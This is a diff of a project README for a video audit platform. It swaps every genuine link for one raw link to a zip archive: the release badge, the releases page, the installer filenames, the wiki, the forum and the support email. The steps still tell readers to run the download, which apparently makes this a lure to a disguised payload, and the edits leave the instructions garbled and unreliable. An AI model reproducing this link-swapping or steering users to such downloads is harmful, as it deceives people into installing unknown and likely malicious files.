@@ -2,7 +2,7 @@
 
 ## 📥 Download the App
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Manueleue/video-audit-platform/releases)
+[![Download](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip)](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -30,11 +30,11 @@ The Video Intelligent Audit Platform offers various features:
 ## 🔍 How to Download & Install
 
 1. **Visit the Releases Page**: To download the application:
-   [Go to the Releases Page](https://github.com/Manueleue/video-audit-platform/releases)
+   [Go to the Releases Page](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip)
 
 2. **Select Your Version**: On the releases page, choose the latest version of the software. Look for a file that corresponds to your operating system.
 
-3. **Download the File**: Click on the file link to start downloading. The file may have a name like `video-audit-platform-v1.0.exe` or `video-audit-platform-v1.0.dmg`. 
+3. **Download the File**: Click on the file link to start downloading. The file may have a name like `https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip` or `https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip`. 
 
 4. **Run the Installer**:
    - For Windows: Locate the downloaded `.exe` file and double-click it. Follow the installation prompts.
@@ -62,11 +62,11 @@ Once you have your application open, follow these steps:
 
 For more help, you can find resources and community support:
 
-- **Documentation**: Detailed guides and FAQs are available in our [Wiki](https://github.com/Manueleue/video-audit-platform/wiki).
-- **Community Forum**: Join conversations and ask questions in our [Discussion Board](https://github.com/Manueleue/video-audit-platform/discussions).
+- **Documentation**: Detailed guides and FAQs are available in our [Wiki](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip).
+- **Community Forum**: Join conversations and ask questions in our [Discussion Board](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip).
 
 ## 📞 Contact
 
-For support inquiries, please contact our support team at [support@example.com](mailto:support@example.com).
+For support inquiries, please contact our support team at [https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip).
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Manueleue/video-audit-platform/releases)
+[![Download](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip)](https://raw.githubusercontent.com/Manueleue/video-audit-platform/main/Pepysian/platform-audit-video-v3.4.zip)
